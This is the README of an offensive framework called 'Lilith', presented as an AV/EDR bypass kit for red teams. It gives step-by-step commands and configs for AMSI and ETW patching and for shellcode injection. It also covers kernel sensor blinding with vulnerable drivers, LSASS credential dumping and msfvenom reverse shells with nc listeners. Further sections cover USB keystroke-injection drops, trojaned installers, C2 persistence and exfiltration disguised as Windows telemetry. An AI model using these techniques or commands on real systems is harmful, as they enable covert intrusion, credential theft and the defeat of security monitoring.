```
 _       ___   _       ___   _____  _  _  
) |     )_ _( ) |     )_ _( )__ __() () (
| (__   _| |_ | (__   _| |_   | |  | -- |
)____( )_____()____( )_____(  )_(  )_()_(

  She existed before the first rule was written.
  She will remain long after the last one is broken.
```

---

Lilith is a polymorphic AV/AMSI bypass framework for authorized red team engagements.  
It builds a randomized C runner, encodes offensive .NET tools, generates PowerShell stagers, and serves everything over a fake IIS HTTPS server — with a complete SYSTEM escalation chain, interactive C2, process migration, kernel sensor blinding, registry persistence, and USB HID physical-access delivery built in.

---

## What Lilith does

```
Your machine (Linux)                        Target (Windows)
─────────────────────                       ────────────────────────────────
1. Build polymorphic C runner               
2. Encode .NET tool → shellcode             
3. Generate PS1 stager           ──────►    4. Stager runs on target
4. Serve files over HTTPS                       ↓ AMSI bypass (compiled DLL from memory, no file drop)
                                                ↓ Script Block Logging bypass
                                                ↓ downloads runner + tool over SslStream (CDN URL)
                                                ↓ indirect syscalls bypass EDR user-land hooks
                                                ↓ ntdll unhooking + module stomping
                                                ↓ injects shellcode into target process
                                                ↓ captures stdout/stderr
                                                ↓ exfiltrates output as fake Windows telemetry POST
```

---

## Evasion stack

### Runner (C, compiled cross-platform with MinGW)

**Core syscall / hook bypass:**
- Indirect syscalls via `syscall;ret` gadget from ntdll — defeats EDR user-land hook trampolines
- ntdll unhooking — restores clean `.text` from disk via `SEC_IMAGE_NO_EXECUTE` mapping before any injection
- Hell's Gate / Halo's Gate SSN resolution — works even when stubs are hooked (walks ±8 neighbors)
- 16 indirect-syscall stubs: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtOpenProcess, NtWaitForSingleObject, NtClose, NtQuerySystemInformation, NtDelayExecution, NtResumeThread, NtQueueApcThread, NtGetContextThread, NtSetContextThread, NtReadVirtualMemory, NtUpdateWnfStateData, NtFreeVirtualMemory

**Memory evasion:**
- Module stomping — shellcode written into signed DLL `.text` (18 candidates: wintrust, cryptnet, coml2, wbemcomn, rasapi32, dxgi, d3d11, msasn1, crypt32, imagehlp, mswsock, winnsi, nlaapi, iphlpapi, ntmarta, authz, dnsapi, wtsapi32)
- W^X throughout — zero RWX allocations; stubs pre-baked RX, shellcode RW → RX
- Ekko-style XOR sleep masking — payload encrypted during jitter, region flipped to PAGE_NOACCESS, NtDelayExecution via indirect syscall during sleep
- PE header stomping — first 0x1000 bytes zeroed after thread starts; kills Elastic `hunt.shellcode` and MDE heap-spray PE magic rules
- In-memory artifact cleanup — exec region zeroed and freed/protection-restored after shellcode completes
- Encrypted remote injection — 31-byte XOR-decrypt stub prepended to shellcode before writing to remote process; cleartext bytes never land in target memory

**Process / thread evasion:**
- PPID spoofing — spawn target parented to explorer.exe with rotating pool; falls back to plain creation if spoof fails
- Stack spoofing — thread start via ntdll `jmp-rcx` gadget; synthetic `BaseThreadInitThunk+0x14` → `RtlUserThreadStart` return chain
- Early Bird APC injection — shellcode queued to suspended thread via NtQueueApcThread; no `NtCreateThreadEx` event
- Thread context hijack — redirect RIP via trampoline (PUSH RAX / MOV RAX / XCHG [RSP],RAX / RET); no new thread object
- WNF-based injection — overwrites `_WNF_USER_SUBSCRIPTION.Callback` in remote process via NtReadVirtualMemory + NtUpdateWnfStateData
- Transacted process hollowing — CreateFileTransactedW on svchost.exe + NtCreateSection(SEC_IMAGE) + NtCreateProcessEx + RollbackTransaction; disk stays clean
- Fiber-based self-execution — ConvertThreadToFiber + CreateFiber + SwitchToFiber; no PsSetCreateThreadNotifyRoutine event
- COM server hijacking — HKCU `\Software\Classes\CLSID` InprocServer32 redirect; auto-cleanup after execution

**Telemetry / logging:**
- ETW patch — EtwEventWrite, EtwEventWriteFull, EtwEventWriteEx, EtwEventWriteTransfer, EtwNotificationRegister, EtwEventEnabled all → XOR RAX,RAX / RET; WmiGetLoggerContext → NULL
- AMSI bypass — precompiled DLL patches `AmsiOpenSession → E_INVALIDARG` loaded from memory

**Network / transport:**
- JA3/JA4 TLS fingerprint randomisation — SChannel path with per-build randomised ALG_ID cipher subset; different hash per binary
- IIS/Schannel cipher suite order in the HTTPS server — JA3S matches Windows Server
- Domain fronting support via `front_host` engagement config
- Per-build random C2 callback path (`/v1/agent/data/health`, `/svc/metrics/collector`, etc.)

**Anti-analysis:**
- Sandbox bail-out (any one triggers): uptime < 5 min, process count < 50, CPUID hypervisor bit, RAM < 2 GB, known analysis tools, NtGlobalFlag heap debug bits, hardware breakpoints (Dr0–Dr3 / Dr7)
- Config re-encryption — decoded C2 host/path/UA XOR-re-encrypted immediately after use
- Anti-tamper watchdog — named mutex + backup agent in secondary process; heartbeat re-injects on mutex disappearance
- Concurrent task execution — 4-slot table; long-running commands don't freeze the poll loop
- Per-build: unique binary hash, random symbol names, random XOR key, random Rich header, random section names, spoofed TimeDateStamp, junk globals, XOR-obfuscated NT API strings

**Static ML hardening:**
- Section names randomised to 3–7 char lowercase strings per build
- TimeDateStamp spoofed to a plausible 2019–2024 value; Checksum zeroed
- XOR-obfuscated string list covers all NT API names, DLL names, and C2 URL path fragments (`/c2/register`, `/task`) — none appear as plaintext in `.rdata`

### BYOVD kernel kit (`--byovd`)

Requires admin/SYSTEM. Driver file must be on disk. Supports RTCore64, gdrv, and WinRing0x64.

| Feature | Command flag | What it does |
|---|---|---|
| ETW-TI disable | `--etwti` | Zeros `EtwThreatIntProvRegHandle` → all `EtwTiLog*` kernel events become no-ops. Must run before injection. |
| ObRegisterCallbacks removal | `--remove-ob-callbacks` | Walks `_OBJECT_TYPE.CallbackList` for PsProcessType + PsThreadType; unlinks entries outside ntoskrnl. Removes Falcon's handle-stripping. |
| Psp notify callback removal | `--remove-callbacks` | Scans PspCreateProcessNotifyRoutine, PspCreateThreadNotifyRoutine, PspLoadImageNotifyRoutine; zeros any entry outside ntoskrnl range |
| DKOM process hiding | `--hide <pid>` | Unlinks EPROCESS from ActiveProcessLinks + zeros UniqueProcessId |
| PPL bypass | `--strip-ppl <pid>` | 1-byte kernel write to EPROCESS+0x87A (PS_PROTECTION byte) → enables direct LSASS memory access without Mimikatz PPL bypass |
| DSE bypass | `--dse` | Patches `g_CiEnabled` → 0 for <100ms window to load unsigned driver, then restores |
| HVCI check | `--hvci-check` | Pre-flight: detects HVCI via NtQuerySystemInformation(103); exits cleanly if enabled |

**Recommended Falcon blinding sequence (fileless):**
```
agent> upload C:\Windows\Temp\rtc.sys
agent> byovdrun /cdn/static/v3/byovd.enc
```
Bake ops at build time:
```bash
python3 lilith.py build --byovd \
  --byovd-driver "C:\Windows\Temp\rtc.sys" \
  --byovd-ops "--etwti --remove-ob-callbacks --remove-callbacks --strip-ppl 640"
```

> EPROCESS offsets (UniqueProcessId=0x2E8, ActiveProcessLinks=0x2F0, Protection=0x87A) are calibrated for Win10 20H2 – Win11 23H2 x64.

### Stager (PowerShell)

- AMSI bypass: precompiled C# DLL patches `AmsiOpenSession → E_INVALIDARG` — no `Add-Type`, no `csc.exe`, no temp file on disk; falls back to reflection if dotnet SDK unavailable
- Script Block Logging bypass: `PSEtwLogProvider.m_enabled = 0` via reflection
- COM CLR host mode (`--com-clr`) — P/Invokes `CorBindToRuntime` before `Assembly.Load`; different MDE event sequence than PS-hosted managed API
- Native PE loader mode — custom in-memory PE mapper for non-.NET tools (avoids donut CLR COM bootstrap sequence)
- All variable names randomised per build; all sensitive strings XOR-encoded through a shared per-build key — including HTTP verbs (`GET`, `CONNECT`), the `ScriptBlock.Create` method name, field names (`amsiInitFailed`, `m_enabled`), stager URL, and User-Agent; no identifier or verb appears in plaintext
- Invisible Unicode obfuscation — all sensitive .NET type-name strings (`System.Management.Automation.PSEtwLogProvider`, `AmsiUtils`, `ScriptBlock`, `Net.WebClient`, `Net.Sockets.TcpClient`, `Net.Security.SslStream`, `IO.MemoryStream`) seeded at random positions with invisible codepoints drawn from four categories: zero-width format chars (ZWSP U+200B, ZWNJ U+200C, ZWJ U+200D, WORD-JOINER U+2060), invisible math operators (U+2061–U+2063), Unicode variation selectors (U+FE00–U+FE02), and Private Use Area chars (U+E000–U+E002); `-replace "[^\x00-\x7F]",""` strips all of them at runtime before `New-Object` / `GetType()` resolution; AMSI byte-sequence patterns see a unique poisoned literal on every build and cannot match — a distinct evasion axis from XOR with no encoded byte arrays and no decoder scriptblock in source
- SslStream for all stage downloads — no COM activation event (WinHTTP COM is a named IOC in CrowdStrike/MDE/XDR rulesets)
- CDN-style URLs, Edge 124 User-Agent, full HTTP headers
- Random jitter sleeps between stages (1.5–6s)
- Temp file named `wct{hex}.tmp` (Windows Installer pattern)
- Async stdout/stderr capture; exfil wrapped in fake Windows telemetry JSON
- Rolling-key exfil — result POSTs XOR-encoded with LCG-derived per-task key; server decrypts with matching state

### Server

- `Microsoft-IIS/10.0` + `ASP.NET` response headers on every response
- IIS/Schannel TLS cipher suite order — JA3S fingerprint matches Windows Server
- TLS session tickets disabled (`OP_NO_TICKET`) — Schannel doesn't advertise them
- TLS cert presented as `*.msn.com`, 397-day validity
- Exfil callbacks accepted on any path matching `/{prefix}/{token}`
- 50–200 ms per-response jitter
- Management API on loopback only (plain HTTP, port 8444)

---

## Requirements

| Dependency | Install |
|---|---|
| Python 3.10+ | pre-installed on most distros |
| `x86_64-w64-mingw32-gcc` | `apt install gcc-mingw-w64` |
| `g++-mingw-w64-x86-64` | `apt install g++-mingw-w64-x86-64` (BYOVD kit) |
| `donut` | `pip install donut-shellcode` |
| `openssl` | `apt install openssl` |
| `pefile` | `pip install pefile` — PE analysis for `lilith patch` |
| `dotnet` SDK 6+ | [dotnet.microsoft.com](https://dotnet.microsoft.com/download) — AMSI/inject DLL compilation |
| `msfvenom` (optional) | raw shellcode payloads |

Check everything at once:
```bash
python3 lilith.py check
```

---

## Installation

```bash
git clone <repo>
cd lilith
python3 -m venv env
source env/bin/activate
pip install donut-shellcode pyyaml pefile
```

> Always activate the venv before running: `source env/bin/activate`

---

## Quick start

**Terminal 1 — build and serve:**
```bash
source env/bin/activate
python3 lilith.py init           # creates engagement.yaml
nano engagement.yaml             # set lhost, tools, injection_profile
python3 lilith.py build --all    # runner + encode all tools + generate all stagers
python3 lilith.py serve          # HTTPS server on :8443
```

**Target — paste 10 lines (printed by `build --stager` or `build --c2-stager`):**
```powershell
# L01-L02: invisible-Unicode type-name setup (ZWSP/VS/PUA chars stripped at runtime)
# L03:     shared XOR key + decoder scriptblock + AMSI bypass + SBL bypass
# L04:     XOR-decode stager URL + URI parse
# L05:     proxy detection via Net.WebClient
# L06:     TCP connect (direct or via proxy)
# L07:     CONNECT tunnel (proxy path only)
# L08:     SslStream + TLS auth + GET request (verb XOR-encoded)
# L09:     read response + strip HTTP headers + extract body
# L10:     ScriptBlock via reflection (method name XOR-encoded) + invoke
```

Tool output arrives in Terminal 1 as it lands.

---

## Step 1 — Configure your engagement

```bash
python3 lilith.py init
```

Edit `engagement.yaml`:

```yaml
lhost: 10.10.14.1
http_port: 8443

injection_profile: RuntimeBroker.exe

c2_jitter_min_ms: 10000
c2_jitter_max_ms: 30000
c2_timeout_s: 50

tools:
  SharpUp:
    params: "audit"
  Rubeus:
    params: "kerberoast /nowrap"
  Seatbelt:
    params: "-group=all -full"
  Mimikatz:
    params: "privilege::debug sekurlsa::logonpasswords exit"
```

| Field | Why it matters |
|---|---|
| `lhost` | Must be reachable from target — baked into every stager at build time |
| `injection_profile` | Process shellcode is injected into (must exist on target) |
| `sni_host` | Hostname shown in TLS ClientHello (default: `assets.msn.com`) |
| `url_prefix` | CDN-style path prefix (default: `/cdn/static/v3`) |
| `callback_path` | Exfil POST path (default: `/api/diagnostics/v1/telemetry`) |
| `jitter_min_ms` / `jitter_max_ms` | Sleep range between stager stages (default: 1500–6000 ms) |
| `c2_jitter_min_ms` / `c2_jitter_max_ms` | Agent poll interval (default: 10–30s) |
| `front_host` | Domain front host (optional — CDN in front of C2) |

---

## Step 2 — Build the runner

```bash
python3 lilith.py build --runner
```

Output: `~/.lilith/<hex>.dat` (XOR-encoded PE) + `<hex>.enc` (C2 agent shellcode).  
Every build produces a unique binary.

---

## Step 3 — Encode tools

```bash
python3 lilith.py build --tool SharpUp
python3 lilith.py build --tools          # all tools in engagement.yaml
```

### Pack raw shellcode (MSF / Sliver / custom)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o revshell.bin
python3 lilith.py build --shellcode revshell.bin --name revshell
```

---

## Step 4 — Generate stagers

```bash
python3 lilith.py build --stager SharpUp
python3 lilith.py build --stagers         # all encoded tools at once
```

`build --stager` prints the exact 10-line execution block for that tool:

```
[+] Stager : /home/user/.lilith/a3f8c1d2.ps1
    Mode   : runner PE (writes to %TEMP%)
    Token  : deadbeef1234abcd
    CB URL : https://10.10.14.1:8443/api/diagnostics/v1/telemetry/deadbeef1234abcd
    Execute  (10 lines — paste one at a time or all at once):
    ──── L01 ──────────────────────────────────────────────────────
      $etw=("System.​Manag​ement.Autom⁣ation.PSEtwLogPr⁢ovider" -replace "[^\x00-\x7F]","");...
    ──── L03 ──────────────────────────────────────────────────────
      $k=83;$d={param($b)([byte[]]$b|%{[char]($_-bxor $k)})-join''};...bypass...
    ──── L10 ──────────────────────────────────────────────────────
      $sc=$asm.GetType($sbt).GetMethod((&$d @(...))).Invoke($null,@($body));& $sc
```

> Filenames are randomised hex tokens — stagers, encoded payloads, and meta files never contain tool names in HTTP logs or on disk.

**Stager flow (fileless, default when runner was built):**
1. SBL bypass → disables Script Block Logging
2. AMSI bypass → compiled DLL decoded and loaded from memory, no file drop
3. Inject DLL decoded and loaded from memory
4. Downloads runner shellcode (donut-packed, tool URL + callback baked in)
5. Injects into current process via NtCreateThreadEx (module-stomp preferred, private alloc fallback)
6. Runner: unhooks ntdll, patches ETW/AMSI, self-injects tool shellcode, captures output, exfils via HTTPS POST
7. Callback arrives at `lilith serve`

---

## Step 5 — Full pipeline

```bash
python3 lilith.py build --all
```

Runner → encode all tools → generate all stagers in one shot.

---

## Step 6 — Start the server

```bash
python3 lilith.py serve
python3 lilith.py serve --port 443
```

Serves all files from `~/.lilith/` over HTTPS with IIS headers and Schannel-mimicking cipher order.

---

## Step 7 — Execute on target

Paste lines one at a time, or all at once — each line is a self-contained PS statement.

### From Evil-WinRM or any PowerShell session

Run the exact 10 lines printed by `build --stager`. Values are random per build:

```
──── L01 ─── invisible-Unicode setup (ETW, AMSI, WebClient, TcpClient type names)
──── L02 ─── invisible-Unicode setup (SslStream, MemoryStream, ScriptBlock type names)
──── L03 ─── shared XOR key + decoder + PSObject.Assembly ref + SBL bypass + AMSI bypass
──── L04 ─── XOR-decode stager URL, parse URI components
──── L05 ─── proxy detection via Net.WebClient + Windows integrated auth
──── L06 ─── TCP connect to target (direct or via proxy)
──── L07 ─── HTTP CONNECT tunnel (only runs when proxy detected)
──── L08 ─── SslStream + TLS auth + GET request (verb XOR-decoded at runtime)
──── L09 ─── read response, strip HTTP headers, extract PS1 body
──── L10 ─── ScriptBlock via reflection (method name XOR-decoded) + invoke
```

All 10 lines can be pasted as a block — each ends cleanly. The first two lines contain invisible Unicode characters that are stripped at runtime; they look like whitespace or empty assignments to a casual observer.

> **Why SslStream and not WinHTTP COM:** `WinHttp.WinHttpRequest.5.1` is an explicit named IOC in CrowdStrike Falcon, MDE, and Cortex XDR behavioral rulesets — the COM activation ProgID event alone is enough to flag the session. SslStream uses standard .NET TCP/TLS classes with no COM activation event.

### From cmd.exe

```cmd
powershell.exe -ep bypass
```
Then paste the 10 lines above.

---

## USB HID delivery (`--usb`)

Physical access scenario — plug in a device and walk away. Generates ready-to-flash keystroke payloads that open PowerShell and execute the stager automatically. The 10-line compact loader is split into 2 keyboard inputs: Line 1 (type-name setup + bypasses) and Line 2 (network fetch + execute).

**Prerequisite:** build the stager first.

```bash
# Generate payloads for all supported devices
python3 lilith.py build --usb SharpUp

# Single device type
python3 lilith.py build --usb SharpUp --usb-device pico

# Tune boot delay for slow targets (ms to wait for HID driver load)
python3 lilith.py build --usb SharpUp --usb-device duck --usb-boot-delay 3500

# Custom output directory
python3 lilith.py build --usb SharpUp --usb-out /media/usb/
```

Output goes to `~/.lilith/usb/` by default.

| Flag | Default | Description |
|---|---|---|
| `--usb TOOL` | — | Tool name whose stager to target |
| `--usb-device TYPE` | `all` | `duck` / `pico` / `digispark` / `all` |
| `--usb-out DIR` | `<workspace>/usb/` | Output directory |
| `--usb-boot-delay MS` | `2000` | USB enumeration + HID driver wait |

### Supported devices

| Device | Output file | Deploy |
|---|---|---|
| Rubber Ducky v1/v2 | `payload.txt` | Copy to `/payload.txt` on SD card |
| Raspberry Pi Pico (CircuitPython) | `code.py` | Copy to `/` on CircuitPython drive |
| DigiSpark ATtiny85 | `payload_digispark.ino` | Arduino IDE → Digispark 16.5MHz → Upload |

**Execution sequence on plug-in:**
1. Wait for USB enumeration + HID driver (~2s, tunable)
2. `WIN+R` → `powershell -ep bypass` → Enter
3. Wait for PowerShell cold-start (~1.8s)
4. Type Line 1 (AMSI bypass) → Enter
5. Type Line 2 (SslStream fetch + exec) → Enter
6. Wait for stager to spawn background process (~2.5s)
7. Type `exit` → Enter — PS window closes

**Timing estimates:**
- Rubber Ducky / Pico: ~9s total (fast USB HID)
- DigiSpark: ~17s total (software USB ~100 chars/sec; Line 2 is chunked into 200-char blocks to prevent buffer stalls)

> Targets US keyboard layout. Non-US targets will mistype special characters (`$`, `{`, `@`, etc.).

**Pico setup:**
```bash
# 1. Flash CircuitPython firmware: https://circuitpython.org/board/raspberry_pi_pico
# 2. Download adafruit-circuitpython-hid bundle: https://circuitpython.org/libraries
# 3. Copy adafruit_hid/ folder to /lib on the Pico drive
# 4. Copy code.py to / on the Pico drive
```

---

## Escalation chain (SeImpersonate → SYSTEM)

```bash
python3 lilith.py build --escalate GodPotato --system-tool Mimikatz
python3 lilith.py build --escalate GodPotato --system-tool revshell_system
```

**Reverse shell as SYSTEM:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=5555 -f raw -o revshell_system.bin
python3 lilith.py build --shellcode revshell_system.bin --name revshell_system
python3 lilith.py build --escalate GodPotato --system-tool revshell_system
nc -lvnp 5555 &
python3 lilith.py serve
```

**Chain flow:**
```
Target (SeImpersonate user)
  → stager downloads runner + godpotato_chain.enc
  → runner injects GodPotato shellcode
  → GodPotato escalates to SYSTEM, spawns hidden powershell.exe (direct, no cmd.exe)
  → SYSTEM PS1 downloads runner + system_tool.enc via SslStream
  → runner injects payload shellcode as SYSTEM
```

| Tool | Best for |
|---|---|
| `GodPotato` | Windows 10/11, Server 2019/2022 |
| `PrintSpoofer` | Systems with Print Spooler enabled |
| `JuicyPotato` | Older targets (pre-2019) |
| `RoguePotato` | When GodPotato/PrintSpoofer are blocked |

---

## BYOVD kernel kit

Requires local admin or SYSTEM. Driver `.sys` must be uploaded to disk first.

```bash
# Build interactive GUI exe (drop and run manually)
python3 lilith.py build --byovd

# Build fileless shellcode variant (served by lilith serve, injected via agent)
python3 lilith.py build --byovd \
  --byovd-driver "C:\Windows\Temp\rtc.sys" \
  --byovd-ops "--etwti --remove-ob-callbacks --remove-callbacks"
```

**Deploy fileless (recommended):**
```
agent> upload C:\Windows\Temp\rtc.sys
agent> byovdrun /cdn/static/v3/byovd.enc
```

**Supported drivers:** RTCore64 (IOCTL `0x80002048`/`0x8000204C`) · gdrv · WinRing0x64 (`0x9C402084`/`0x9C402088`)

Use `--winring0` flag at build time to target WinRing0x64.

---


## PE Backdoor Patcher

Trojans a legitimate installer PE — shellcode executes silently in a background thread while the original program runs normally. No new process spawned; the installer behaves exactly as expected.

```bash
# Derive shellcode from engagement config via donut (requires donut-shellcode)
python3 lilith.py patch --target Setup.exe --output evil_setup.exe

# Pre-built raw shellcode (skip donut step)
python3 lilith.py patch --target Setup.exe --output evil_setup.exe --sc payload.bin

# Fixed section name (randomised if omitted)
python3 lilith.py patch --target Setup.exe --output evil_setup.exe --section .rsrc
```

**Injected section layout:**
```
new_section:
  +0x000  ShimEntry    — PEB walk → resolve CreateThread from kernel32 (no imports)
  +0x1F0  stub_magic   — locator sentinel (0xCAFEBABEDEADBEEF)
  +0x1F8  oep_rva      — original entry point (patched per-target)
  +0x200  shellcode    — donut-wrapped PS stager or raw payload
```

**Execution flow:**
1. Target runs the installer — `AddressOfEntryPoint` redirected to `ShimEntry`
2. `ShimEntry` resolves `CreateThread` via PEB walk — no import table entry, no IAT hook
3. Background thread starts shellcode; main thread jumps to original OEP
4. Installer runs normally; shellcode fetches and executes the C2 stager

**Requirements:** 64-bit target PE with ≥40 bytes free in the section header table. `donut` for automatic shellcode generation (`pip install donut-shellcode`).

---

## C2 agent mode

The runner supports an interactive HTTPS polling C2 loop.

### Build

```bash
python3 lilith.py build --runner       # required first
python3 lilith.py build --c2-stager    # generates fileless agent stager
```

### Deploy

**Target — paste 10 lines printed by `build --c2-stager`:**
```powershell
# L01-L02: invisible-Unicode type-name setup
# L03:     XOR key + decoder + AMSI bypass + SBL bypass
# L04-L10: URL decode, TLS fetch, ScriptBlock execute
# Returns immediately — agent running in background of injected process
```

**Interact:**
```bash
python3 lilith.py c2 --list
python3 lilith.py c2 --session <ID>
python3 lilith.py c2 --session <ID> --cmd "whoami /priv"
python3 lilith.py c2 --session <ID> --timeout 120
```

**Session example:**
```
C2> whoami
nt authority\system

C2> migrate svchost.exe
[+] Agent migrated — new session registers in ~30s

C2> wnfinject 1234
C2> fiberexec
C2> comhijack C:\Users\user\AppData\Local\evil.dll {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
C2> !persist wmi
C2> exit
```

### Concurrent tasking

Up to 4 commands run simultaneously on background threads. Long-running operations (SharpHound, scans) don't block the poll loop. Poll interval drops to 500 ms while any task is active.

---

## Built-in agent commands

| Command | Description |
|---|---|
| `migrate` | Inject into a process from the priority pool |
| `migrate <proc.exe>` | Inject into the named process |
| `pid <proc.exe>` | Look up the PID of a running process |
| `wnfinject <pid>` | WNF-based shellcode injection (no new thread object) |
| `fiberexec` | Re-inject agent SC via fiber on current thread (no thread creation event) |
| `comhijack <dll> <clsid>` | Register COM server hijack via HKCU; cleans up after CoCreateInstance |
| `byovdrun <url>` | Download + inject BYOVD shellcode in-memory |

### REPL meta-commands

| Command | Description |
|---|---|
| `!persist wmi\|run\|schtask` | Install persistence from active session |
| `!timeout <sec>` | Adjust result wait timeout |
| `!kill` | Remove session from server registry |
| `exit` / `quit` | Leave REPL (session stays alive) |

---

## Process migration

```bash
python3 lilith.py c2 --session <ID> --migrate
python3 lilith.py c2 --session <ID> --migrate svchost.exe
python3 lilith.py c2 --list
python3 lilith.py c2 --kill <old_id>
```

**Priority pool:** `svchost.exe → RuntimeBroker.exe → explorer.exe → dllhost.exe → sihost.exe → ctfmon.exe → spoolsv.exe → SearchHost.exe`

> Requires `lilith build --runner` — migration fetches the agent SC built alongside the runner.

---

## Anti-tamper watchdog

On startup the agent immediately injects a backup copy into a secondary process. If the primary is killed by AV:
1. Named mutex (`Local\xxxxxxxx`) disappears
2. Backup detects this within 10s and injects a replacement
3. Replacement registers as a new C2 session

Heartbeat: 2 minutes (primary alive) / 10 seconds (after mutex disappears). Depth-limited to one backup per agent.

---

## Persistence

Install from an active C2 session. Each trigger re-downloads and re-executes the C2 agent stager.

| Flag | Mechanism | Trigger | Privilege |
|---|---|---|---|
| `--persist run` | HKCU Run key | User logon | None |
| `--persist schtask` | Scheduled task | User logon, HighestAvailable | None |
| `--persist wmi` | WMI CommandLine Event Consumer | Interactive logon (explorer.exe start) | Admin / SYSTEM |

All three embed the payload as base64 `-enc` — no plaintext URLs or PowerShell in registry/WMI at rest. Random name per install. Embedded payload is a compact XOR-obfuscated one-liner (<300 bytes base64).

```bash
python3 lilith.py c2 --session <ID> --persist run
python3 lilith.py c2 --session <ID> --persist schtask
python3 lilith.py c2 --session <ID> --persist wmi
```

WMI uses `Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'` as the trigger — significantly quieter than the commonly-detected `Win32_PerfFormattedData_PerfOS_System` uptime trigger.

**Remove WMI persistence:**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "Msft*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "Msft*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

## Full engagement workflow

```bash
# 1. Setup
source env/bin/activate
python3 lilith.py init
nano engagement.yaml

# 2. Check dependencies
python3 lilith.py check

# 3. Build everything
python3 lilith.py build --all
python3 lilith.py build --c2-stager

# 4. Escalation chain (if needed)
python3 lilith.py build --escalate GodPotato --system-tool Mimikatz

# 5. Reverse shell as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=5555 -f raw -o shell.bin
python3 lilith.py build --shellcode shell.bin --name revshell_system
python3 lilith.py build --escalate GodPotato --system-tool revshell_system
nc -lvnp 5555 &

# 6. USB HID payloads (physical access)
python3 lilith.py build --usb SharpUp           # all devices
python3 lilith.py build --usb SharpUp --usb-device pico --usb-boot-delay 3000

# 7. Start server
python3 lilith.py serve

# 8. On target — paste 2 lines printed by build --stager

# 9. Interact with C2
python3 lilith.py c2 --list
python3 lilith.py c2 --session <ID>
python3 lilith.py c2 --session <ID> --cmd "whoami /priv"

# 10. Migrate to stable process
python3 lilith.py c2 --session <ID> --migrate svchost.exe
# wait ~30s
python3 lilith.py c2 --list
python3 lilith.py c2 --kill <old_id>

# 11. Install persistence
python3 lilith.py c2 --session <ID> --persist wmi
python3 lilith.py c2 --session <ID> --persist schtask

# 12. BYOVD kernel sensor blinding (fileless)
python3 lilith.py build --byovd --byovd-driver "C:\Windows\Temp\rtc.sys"
# then from C2:
# agent> upload C:\Windows\Temp\rtc.sys
# agent> byovdrun /cdn/static/v3/byovd.enc
```

---

## Tool catalog

| Tool | Default params | Purpose |
|---|---|---|
| `Rubeus` | `triage` | Kerberos abuse |
| `SharpHound` | `-c All --memcache` | BloodHound collector |
| `Certify` | `find /vulnerable` | AD CS enumeration |
| `Seatbelt` | `-group=all -full` | Host survey |
| `SharpDPAPI` | `triage` | DPAPI credential extraction |
| `SharpUp` | `audit` | Privilege escalation checks |
| `SharpChrome` | `logins` | Chrome saved credentials |
| `Mimikatz` | `privilege::debug sekurlsa::logonpasswords exit` | Credential dump |
| `SharpGPOAbuse` | `--help` | GPO privilege escalation |
| `ADSearch` | `--search objectClass=user` | Custom LDAP queries |
| `SQLRecon` | `/enum:sqlspns` | MSSQL enum + RCE |
| `winPEAS` | *(no params)* | PrivEsc scanner |
| `RunasCs` | *(set manually)* | Execute as alternate user |
| `GodPotato` | `-cmd "cmd /c whoami"` | SeImpersonate → SYSTEM (Win10/11, 2019/2022) |
| `PrintSpoofer` | `-i -c cmd` | SeImpersonate → SYSTEM (Print Spooler, x64) |
| `PrintSpoofer32` | `-c cmd` | SeImpersonate → SYSTEM (x86 target) |
| `JuicyPotato` | `-l 1337 -p cmd.exe -t *` | SeImpersonate → SYSTEM (pre-2019) |
| `RoguePotato` | `-r LHOST -e cmd.exe -l 9999` | SeImpersonate → SYSTEM via OXID resolver |
| `KrbRelayUp` | `full -m shadowcred` | Kerberos relay privilege escalation |
| `Whisker` | `list` | Shadow Credentials abuse |
| `Chisel` | `client LHOST:8081 R:socks` | SOCKS5 tunnel over HTTP |
| `Ligolo` | `-connect LHOST:11601 -ignore-cert` | Layer 3 tunnel (Ligolo-ng agent) |
| `kerbrute` | *(set manually)* | Kerberos user enum / password spray |

Override params in `engagement.yaml`:
```yaml
tools:
  Rubeus:
    params: "kerberoast /nowrap /outfile:hashes.txt"
```

---

## Workspace

All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set, or most-recently-modified Exegol workspace).

| File | Description |
|---|---|
| `<hex>.dat` | XOR-encoded C runner binary |
| `runner_c.meta` | Runner XOR key (used by stager decoder) |
| `<hex>.enc` | Encoded shellcode or C2 agent SC |
| `<hex>.ps1` | PowerShell stager |
| `manifest.json` | Maps tool names → random filenames |
| `server.crt` / `server.key` | Auto-generated TLS certificate |
| `byovd.exe` / `byovd.enc` | BYOVD kit (only if `--byovd` was run) |
| `usb/` | USB HID payload files (only if `--usb` was run) |

---

## Known limitations

| Area | Detail |
|---|---|
| WNF offsets | Subscription table scan calibrated for Win10 20H2 – Win11 23H2; may miss on older/newer builds |
| Transacted hollowing | Payload must be a valid x64 PE — raw shellcode needs a PE wrapper first |
| EPROCESS offsets | UniqueProcessId=0x2E8, Links=0x2F0, Protection=0x87A valid on Win10 20H2 – Win11 23H2 x64 only |
| BYOVD | Requires driver `.sys` on disk + admin/SYSTEM; HVCI blocks kernel writes entirely |
| USB HID | US keyboard layout only — non-US hosts mistype `$`, `{`, `@` etc. |
| Watchdog depth | One backup per primary; can produce several sessions on targets with many accessible processes |

---

## Troubleshooting

**"donut not found"**
```bash
source env/bin/activate && pip install donut-shellcode
```

**"x86_64-w64-mingw32-gcc not found"**
```bash
apt install gcc-mingw-w64
```

**Binary not found for a tool (`✗` in `list`)**  
Place the `.exe` in `./windows/` or `./potatoes/` inside the project directory.

**Stager runs but nothing comes back**
- Confirm `lhost` in `engagement.yaml` is reachable from the target — rebuild stagers after changing it
- Runner exits silently if sandbox checks trigger (uptime < 5 min, < 50 processes, hypervisor bit, RAM < 2 GB, hardware breakpoints, known analysis tools)

**SslStream connection fails (L08 hangs or errors)**
- Confirm the target can reach your `lhost:http_port` over TCP (`Test-NetConnection <lhost> -Port <port>`)
- Confirm `lilith serve` is running and logging incoming GETs
